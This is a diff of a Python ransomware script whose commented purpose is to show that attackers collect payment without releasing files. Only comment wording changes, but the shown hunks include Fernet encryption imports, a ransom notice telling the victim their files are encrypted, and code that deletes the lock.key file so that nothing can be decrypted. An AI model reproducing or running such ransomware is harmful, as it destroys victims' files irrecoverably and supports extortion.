@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#This is a ransomware without the password/decryption_code and it is to demonstrate some hackers will collect payment without any intention of releasing the locked file.
+#This is a ransomware without the password/decryption_code and it is to demonstrate some hackers can collect payment without any intention of releasing the locked file.
 import os
 from cryptography.fernet import Fernet
 
@@ -40,7 +40,7 @@ print ('''
 ATTENTION!!!.. All your files has been encrypted by our Ransomware. You are victim 0101. Read the payment_instructions file for more details....ATTENTION!!!
 
 ''')
-filepath = "/home/parrot/Esu/lock.key" #Replace with actual directory where the ransomware program is being run or inverse the frontslash for windows(\)
+filepath = "/home/parrot/Esu/lock.key" #Replace with actual directory where the ransomware program is being run.
 
 try:
 	os.remove(filepath)
